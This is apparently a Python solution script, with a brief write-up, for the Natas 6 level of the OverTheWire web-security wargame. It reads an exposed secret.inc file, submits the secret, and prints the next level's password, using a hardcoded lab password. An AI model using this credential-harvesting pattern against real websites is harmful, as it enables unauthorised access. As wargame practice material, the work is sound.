import requests
import re

name = "natas6"

secreturl = f"http://{name}.natas.labs.overthewire.org/includes/secret.inc"
url = f"http://{name}.natas.labs.overthewire.org"
auth = (f"{name}","aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1")

session = requests.session()
logon = session.post(secreturl,auth=auth)
secret = re.findall(r'\$secret = "(\w+)"',logon.text)[0]
sendSecret = session.post(url,auth=auth,data={'secret':secret,'submit':''})
regex = re.compile(r'The password for natas7 is ([\w\d]+)')
try:
    passwd = regex.findall(sendSecret.text)[0]
    print(passwd)
except IndexError:
    ...
    
"""Natas 6

This one was different, but still not that hard. 
After inspecting source code of the website I saw how it handle params from http post request.
Website was checking if key "submit" was in request data together with key "secret" with proper secret password
Which I found by just looking at include dialog. I grabbed secret key from secret.inc file using python
and then used it in post request data. After all of that password appeared.

"""
